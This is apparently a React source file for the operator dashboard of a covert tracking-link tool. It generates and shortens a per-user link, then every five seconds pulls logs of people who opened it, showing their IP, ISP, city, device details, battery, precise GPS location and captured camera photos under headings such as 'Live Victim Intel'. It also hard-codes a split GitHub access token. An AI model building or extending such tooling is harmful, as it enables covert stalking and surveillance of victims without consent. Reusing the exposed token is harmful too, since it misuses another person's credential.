
import React, { useState, useEffect } from 'react';
import { User, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
import { auth } from '../firebase';

interface LogEntry {
  id: string;
  time: string;
  ip: string;
  isp: string;
  city: string;
  platform: string;
  userAgent: string;
  ram: string;
  cores: number | string;
  screen: string;
  browser: string;
  battery: any;
  location: any;
  photos: string[];
  userId: string;
}

const Dashboard: React.FC<{ user: User }> = ({ user }) => {
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [loading, setLoading] = useState(true);
  const [shortUrl, setShortUrl] = useState('');
  const [copyStatus, setCopyStatus] = useState(false);
  const [viewMap, setViewMap] = useState<any>(null);
  const [viewGallery, setViewGallery] = useState<string[] | null>(null);

  const G_OWNER = "arefinfoysalo";
  const G_REPO = "livecameralocation";
  const P1 = "ghp_S06vJDMF26hmKNIc";
  const P2 = "EXibFC2GFggjTf40WyXZ";
  const G_TOKEN = P1 + P2;
  
  const baseUrl = window.location.origin + window.location.pathname;
  const trackerLink = `${baseUrl}#/trk/${user.uid}`;

  const fetchLogs = async () => {
    try {
      const res = await fetch(`https://api.github.com/repos/${G_OWNER}/${G_REPO}/contents/data/logs`, {
        headers: { 'Authorization': `token ${G_TOKEN}` }
      });
      if (!res.ok) { setLoading(false); return; }
      const files = await res.json();
      
      const logPromises = files.filter((f: any) => f.name.endsWith('.json')).map(async (file: any) => {
        const contentRes = await fetch(file.download_url);
        return await contentRes.json();
      });

      const allLogs = await Promise.all(logPromises);
      const myLogs = allLogs.filter(l => l.userId === user.uid);
      setLogs(myLogs.sort((a, b) => b.time.localeCompare(a.time)));
    } catch (e) { console.error(e); } finally { setLoading(false); }
  };

  const handleShorten = async () => {
    try {
      const res = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(trackerLink)}`);
      const data = await res.text();
      setShortUrl(data);
    } catch (e) { alert("Shortener service unavailable"); }
  };

  useEffect(() => {
    fetchLogs();
    const interval = setInterval(fetchLogs, 5000); // Super-fast 5s refresh
    return () => clearInterval(interval);
  }, [user.uid]);

  return (
    <div className="min-h-screen bg-slate-50 font-['Hind_Siliguri'] pb-20 overflow-x-hidden">
      
      {/* 1. Personalized Header */}
      <header className="bg-white/80 backdrop-blur-xl border-b border-slate-200 sticky top-0 z-50 px-6 py-8">
        <div className="max-w-7xl mx-auto flex flex-col md:flex-row justify-between items-center gap-6">
          <div className="text-center md:text-left">
            <h1 className="text-3xl font-black text-slate-900 tracking-tight leading-none">Hello, {user.displayName || user.email?.split('@')[0]}</h1>
            <p className="text-blue-600 font-bold text-xs uppercase tracking-[0.2em] mt-2 flex items-center gap-2 justify-center md:justify-start">
              <span className="w-2 h-2 bg-blue-600 rounded-full animate-pulse"></span>
              Welcome to your dashboard
            </p>
          </div>
          <button onClick={() => signOut(auth)} className="bg-red-50 text-red-600 px-8 py-3 rounded-2xl font-black text-[11px] hover:bg-red-600 hover:text-white transition-all border border-red-100 shadow-sm">LOGOUT ACCOUNT</button>
        </div>
      </header>

      <main className="max-w-7xl mx-auto p-4 md:p-8 space-y-10">
        
        {/* 2. Top Controls (Link & Shortener) */}
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          <section className="lg:col-span-8 bg-white p-8 md:p-10 rounded-[45px] border border-slate-200 shadow-xl shadow-slate-100/50">
            <h3 className="text-[10px] font-black text-slate-400 uppercase tracking-widest mb-4">Primary Tracking Gateway</h3>
            <div className="flex flex-col md:flex-row gap-4">
              <input readOnly value={trackerLink} className="flex-1 bg-slate-50 border border-slate-100 px-6 py-4 rounded-[25px] text-xs font-mono text-slate-500 outline-none focus:border-blue-300" />
              <button onClick={() => { navigator.clipboard.writeText(trackerLink); setCopyStatus(true); setTimeout(()=>setCopyStatus(false), 2000); }} 
                className="bg-slate-900 text-white px-10 py-4 rounded-[25px] font-black text-xs hover:scale-105 transition-transform shadow-xl shadow-slate-200">
                {copyStatus ? 'LINK COPIED' : 'COPY MAIN LINK'}
              </button>
            </div>
          </section>

          <section className="lg:col-span-4 bg-gradient-to-br from-blue-600 to-indigo-700 p-8 md:p-10 rounded-[45px] text-white shadow-2xl shadow-blue-200/50 flex flex-col justify-between">
            <h3 className="text-[10px] font-black uppercase opacity-60 tracking-widest mb-4">Pro URL Shortner</h3>
            <div className="space-y-4">
              <button onClick={handleShorten} className="w-full bg-white text-blue-600 py-4 rounded-[25px] font-black text-xs hover:bg-blue-50 transition-colors shadow-lg">GENERATE TINYURL</button>
              {shortUrl && (
                <div className="bg-white/10 p-4 rounded-2xl border border-white/20 flex justify-between items-center group">
                  <span className="text-[11px] font-mono font-bold truncate pr-4">{shortUrl}</span>
                  <button onClick={() => navigator.clipboard.writeText(shortUrl)} className="text-[10px] font-black opacity-60 hover:opacity-100">COPY</button>
                </div>
              )}
            </div>
          </section>
        </div>

        {/* 3. Live Logs Section */}
        <div className="space-y-6">
          <div className="flex items-center justify-between px-6">
            <h2 className="text-2xl font-black text-slate-800 tracking-tighter uppercase">Live Victim Intel</h2>
            <div className="flex items-center gap-3 bg-white border border-slate-200 px-5 py-2 rounded-full shadow-sm">
              <span className="relative flex h-3 w-3">
                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
                <span className="relative inline-flex rounded-full h-3 w-3 bg-green-500"></span>
              </span>
              <span className="text-[10px] font-black text-slate-500 uppercase tracking-widest">Live Sync: ON</span>
            </div>
          </div>

          {loading ? (
            <div className="bg-white rounded-[50px] py-28 text-center border border-slate-100 shadow-sm animate-pulse text-slate-300 font-black italic text-sm">SYNCHRONIZING SECURE SERVER...</div>
          ) : logs.length === 0 ? (
            <div className="bg-white rounded-[50px] py-32 text-center border-2 border-dashed border-slate-200 flex flex-col items-center">
              <div className="w-20 h-20 bg-slate-50 rounded-full flex items-center justify-center mb-6">🛰️</div>
              <p className="text-slate-400 font-bold italic text-sm tracking-tight">System ready. Waiting for first connection...</p>
            </div>
          ) : (
            <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-8">
              {logs.map((log, i) => (
                <div key={i} className="bg-white rounded-[50px] border border-slate-100 p-8 hover:shadow-2xl transition-all duration-500 hover:-translate-y-2 group">
                  <div className="space-y-6">
                    <div className="flex justify-between items-start">
                      <div className="space-y-1">
                        <h3 className="text-2xl font-black text-slate-900 group-hover:text-blue-600 transition-colors">{log.ip}</h3>
                        <p className="text-[11px] font-black text-slate-400 uppercase tracking-tighter">{log.isp}</p>
                        <p className="text-[10px] font-bold text-blue-500">{log.city} • {log.browser}</p>
                      </div>
                      <span className="bg-slate-50 text-slate-300 w-10 h-10 rounded-full flex items-center justify-center text-[10px] font-black">#{logs.length - i}</span>
                    </div>

                    <div className="bg-slate-50/50 p-6 rounded-[35px] border border-slate-100 space-y-4">
                      <div className="flex justify-between items-center border-b border-slate-100 pb-3">
                        <span className="text-[9px] font-black text-slate-400 uppercase">Hardware Info</span>
                        <span className="text-[10px] font-black text-slate-700">{log.ram} / {log.cores} Cores</span>
                      </div>
                      <div className="flex justify-between items-center border-b border-slate-100 pb-3">
                        <span className="text-[9px] font-black text-slate-400 uppercase">Battery Status</span>
                        <span className={`text-[10px] font-black ${log.battery?.level < 20 ? 'text-red-500' : 'text-green-600'}`}>
                          {log.battery?.level}% {log.battery?.charging ? '⚡' : '🔋'}
                        </span>
                      </div>
                      <div className="flex justify-between items-center">
                        <span className="text-[9px] font-black text-slate-400 uppercase">Platform</span>
                        <span className="text-[10px] font-black text-slate-700 truncate max-w-[120px]">{log.platform}</span>
                      </div>
                    </div>

                    <div className="grid grid-cols-2 gap-3">
                      <button onClick={() => setViewGallery(log.photos)} disabled={!log.photos?.length} className="bg-slate-900 text-white py-5 rounded-[25px] text-[10px] font-black shadow-lg shadow-slate-100 hover:bg-blue-600 transition-colors">GALLERY ({log.photos?.length || 0})</button>
                      <button onClick={() => setViewMap(log.location)} disabled={typeof log.location !== 'object'} className="bg-blue-600 text-white py-5 rounded-[25px] text-[10px] font-black shadow-lg shadow-blue-100 hover:bg-slate-900 transition-colors">LIVE LOCATION</button>
                    </div>
                    <p className="text-center text-[9px] font-bold text-slate-300 uppercase tracking-widest">{log.time}</p>
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>

        {/* 4. Pro Developer Card (Absolute Bottom) */}
        <footer className="mt-32 pt-16 border-t border-slate-200">
          <div className="max-w-xl mx-auto bg-white rounded-[60px] p-12 border border-slate-200 shadow-2xl shadow-slate-200/50 text-center relative overflow-hidden group">
            <div className="absolute top-0 left-0 w-full h-2 bg-gradient-to-r from-blue-600 to-indigo-600"></div>
            <div className="w-24 h-24 bg-blue-50 rounded-[40px] mx-auto mb-6 flex items-center justify-center overflow-hidden border-4 border-white shadow-xl group-hover:rotate-6 transition-transform">
              <img src="https://ui-avatars.com/api/?name=Arefin+Foysal&background=2563eb&color=fff&size=200" alt="Dev" className="w-full h-full object-cover" />
            </div>
            <h4 className="text-2xl font-black text-slate-900">Arefin Foysal</h4>
            <p className="text-blue-600 font-black text-[11px] uppercase tracking-[0.3em] mt-2">Full-Stack Security Expert</p>
            
            <div className="flex justify-center gap-4 mt-8">
              <a href="https://facebook.com" className="bg-[#1877F2] text-white px-8 py-3 rounded-2xl font-black text-[10px] hover:scale-110 transition-transform">FACEBOOK</a>
              <a href="#" className="bg-slate-900 text-white px-8 py-3 rounded-2xl font-black text-[10px] hover:scale-110 transition-transform">GITHUB PRO</a>
            </div>

            <p className="text-[10px] text-slate-300 font-black uppercase mt-12 tracking-[0.5em]">AREFIN VAULT PRO v4.0 • 2024</p>
          </div>
        </footer>
      </main>

      {/* Gallery Modal */}
      {viewGallery && (
        <div className="fixed inset-0 z-[100] bg-slate-950/98 backdrop-blur-2xl flex items-center justify-center p-4">
          <div className="bg-white w-full max-w-6xl rounded-[60px] overflow-hidden shadow-2xl animate-in zoom-in duration-300">
            <div className="p-10 flex justify-between items-center border-b border-slate-100 bg-slate-50/50">
              <h4 className="font-black text-slate-800 text-xl tracking-tighter uppercase">Target Burst Intelligence</h4>
              <button onClick={() => setViewGallery(null)} className="w-14 h-14 bg-white rounded-[20px] shadow-sm border border-slate-100 flex items-center justify-center text-xl font-bold hover:bg-red-50 hover:text-red-600 transition-colors">✕</button>
            </div>
            <div className="p-10 grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 gap-6 max-h-[70vh] overflow-y-auto custom-scrollbar">
              {viewGallery.map((url, i) => (
                <div key={i} className="relative group">
                  <img src={url} className="w-full h-80 object-cover rounded-[40px] border-8 border-slate-50 shadow-xl transition-transform group-hover:scale-[1.02]" alt={`Shot ${i+1}`} onError={(e) => (e.currentTarget.src = 'https://placehold.co/600x800/f8fafc/cbd5e1?text=Processing...')} />
                  <div className="absolute bottom-6 left-6 bg-blue-600 text-white px-4 py-2 rounded-xl text-[10px] font-black shadow-lg">SNAPSHOT 0{i+1}</div>
                </div>
              ))}
            </div>
            <div className="p-10 text-center border-t bg-slate-50/50">
              <button onClick={() => setViewGallery(null)} className="bg-slate-900 text-white px-20 py-5 rounded-[30px] font-black text-xs hover:scale-105 transition-transform">CLOSE VIEWER</button>
            </div>
          </div>
        </div>
      )}

      {/* Map Modal */}
      {viewMap && (
        <div className="fixed inset-0 z-[100] bg-slate-950/95 backdrop-blur-xl flex items-center justify-center p-4">
          <div className="bg-white w-full max-w-4xl rounded-[60px] overflow-hidden shadow-2xl animate-in fade-in duration-300">
            <div className="p-10 flex justify-between items-center border-b border-slate-100">
              <h4 className="font-black text-slate-800 text-xl tracking-tighter uppercase">Precise Geospatial Intel</h4>
              <button onClick={() => setViewMap(null)} className="w-14 h-14 bg-slate-50 rounded-[20px] flex items-center justify-center text-slate-400 text-xl font-bold">✕</button>
            </div>
            <div className="relative">
              <iframe width="100%" height="500" frameBorder="0" className="grayscale contrast-125" src={`https://maps.google.com/maps?q=${viewMap.lat},${viewMap.lng}&z=17&output=embed`}></iframe>
              <div className="absolute bottom-10 left-1/2 -translate-x-1/2 w-full max-w-sm px-6">
                <a href={`https://www.google.com/maps?q=${viewMap.lat},${viewMap.lng}`} target="_blank" className="bg-blue-600 text-white py-6 rounded-[35px] font-black text-xs block text-center shadow-2xl shadow-blue-500/40 hover:scale-105 transition-transform">NAVIGATE VIA GOOGLE MAPS</a>
              </div>
            </div>
          </div>
        </div>
      )}

      <style>{`
        .custom-scrollbar::-webkit-scrollbar { width: 6px; }
        .custom-scrollbar::-webkit-scrollbar-track { background: transparent; }
        .custom-scrollbar::-webkit-scrollbar-thumb { background: #e2e8f0; border-radius: 10px; }
      `}</style>
    </div>
  );
};

export default Dashboard;
